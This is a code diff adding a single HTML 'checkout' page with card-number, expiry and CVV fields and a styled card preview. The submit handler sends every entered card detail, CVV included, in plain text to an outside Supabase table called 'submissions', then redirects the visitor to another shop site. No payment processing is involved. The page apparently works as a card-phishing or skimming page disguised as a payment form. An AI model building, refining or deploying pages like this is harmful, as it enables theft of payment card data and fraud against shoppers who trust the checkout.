@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout Design Test</title>
+    <style>
+        :root {
+            --primary-color: #ff6b00;
+            --primary-hover: #e05e00;
+            --bg-color: #f9f9f9;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--bg-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .checkout-wrapper {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
+            display: flex;
+            gap: 50px;
+            max-width: 850px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .form-section { flex: 1; }
+        .preview-section { display: flex; align-items: center; justify-content: center; }
+        h2 { font-size: 11px; color: #888; margin: 0; letter-spacing: 1px; }
+        h3 { font-size: 22px; color: #111; margin-top: 5px; margin-bottom: 25px; }
+        label { display: block; font-size: 13px; color: #444; margin-bottom: 6px; font-weight: 500; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 16px;
+            border: 1px solid #e1e1e1;
+            border-radius: 6px;
+            background-color: #fff9f5;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        input:focus { outline: none; border-color: var(--primary-color); background-color: #ffffff; }
+        .row { display: flex; gap: 12px; }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover { background-color: var(--primary-hover); }
+        .virtual-card {
+            width: 320px;
+            height: 190px;
+            background: linear-gradient(135deg, #ff7e1d, #e05e00);
+            border-radius: 14px;
+            padding: 22px;
+            color: white;
+            box-shadow: 0 10px 25px rgba(255, 107, 0, 0.25);
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        .card-top { display: flex; justify-content: space-between; align-items: center; }
+        .card-chip { width: 38px; height: 28px; background: #ffffff; border-radius: 4px; opacity: 0.9; }
+        .card-brand { font-weight: bold; font-style: italic; letter-spacing: 1px; font-size: 16px; }
+        .card-number-display { font-size: 18px; letter-spacing: 2px; font-family: monospace; }
+        .card-details-bottom { display: flex; justify-content: space-between; align-items: flex-end; }
+        .card-holder-label { font-size: 9px; opacity: 0.8; text-transform: uppercase; }
+        .card-holder-display, .card-expiry-display { font-size: 13px; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+    <div class="checkout-wrapper">
+        <div class="form-section">
+            <h2>STEP 2</h2>
+            <h3>CHECKOUT</h3>
+            
+            <form id="checkoutForm">
+                <label>Name on Card</label>
+                <input type="text" id="name" required>
+
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" maxlength="19" required>
+
+                <div class="row">
+                    <div>
+                        <label>Expiry Date</label>
+                        <input type="text" id="expiry" maxlength="5" required>
+                    </div>
+                    <div>
+                        <label>CVV</label>
+                        <input type="password" id="cvv" maxlength="4" required>
+                    </div>
+                </div>
+
+                <button type="submit" id="submitBtn">Complete Payment</button>
+            </form>
+        </div>
+
+        <div class="preview-section">
+            <div class="virtual-card">
+                <div class="card-top">
+                    <div class="card-chip"></div>
+                    <div class="card-brand">VISA</div>
+                </div>
+                <div class="card-number-display" id="displayNum">•••• •••• •••• ••••</div>
+                <div class="card-details-bottom">
+                    <div>
+                        <div class="card-holder-label">Name on Card</div>
+                        <div class="card-holder-display" id="displayName"></div>
+                    </div>
+                    <div>
+                        <div class="card-holder-label">Expiry Date</div>
+                        <div class="card-expiry-display" id="displayExpiry"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Supabase SDK Script -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script>
+        const SUPABASE_URL = 'https://pmcstipaishydmjxhyvg.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBtY3N0aXBhaXNoeWRtanhoeXZnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU0MzE5MzAsImV4cCI6MjEwMTAwNzkzMH0.PaYij28i3kA07DSkSedoWiTczwckrnR59OONJrl6nUc';
+
+        const dbClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
+            auth: { persistSession: false },
+            global: {
+                headers: { 'x-client-info': 'supabase-js-web' },
+            },
+        });
+        
+        const redirectUrl = "https://www.novucart.online";
+
+        const nameInput = document.getElementById('name');
+        const cardNumInput = document.getElementById('cardNumber');
+        const expiryInput = document.getElementById('expiry');
+
+        // Instant name sync
+        nameInput.addEventListener('input', (e) => {
+            document.getElementById('displayName').textContent = e.target.value;
+        });
+
+        // Instant card number sync with spacing
+        cardNumInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '').substring(0, 16);
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = formattedValue;
+            document.getElementById('displayNum').textContent = formattedValue === '' ? '•••• •••• •••• ••••' : formattedValue;
+        });
+
+        // Instant expiry sync with slash
+        expiryInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '').substring(0, 4);
+            if (value.length >= 3) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            e.target.value = value;
+            document.getElementById('displayExpiry').textContent = value;
+        });
+
+        // Form submit handler
+        document.getElementById('checkoutForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const name = nameInput.value.trim();
+            const cardNumber = cardNumInput.value.trim();
+            const expiry = expiryInput.value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            if (!name || !cardNumber || !expiry || !cvv) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.textContent = "Processing...";
+            submitBtn.disabled = true;
+
+            try {
+                const { error } = await dbClient
+                    .from('submissions')
+                    .insert([{ name: name, cardNumber: cardNumber, expiry: expiry, cvv: cvv }]);
+
+                if (error) {
+                    alert("Supabase Error: " + error.message);
+                    submitBtn.textContent = "Complete Payment";
+                    submitBtn.disabled = false;
+                    return;
+                }
+
+                window.location.replace(redirectUrl);
+
+            } catch (err) {
+                alert("Network/Script Error: " + err.message);
+                submitBtn.textContent = "Complete Payment";
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
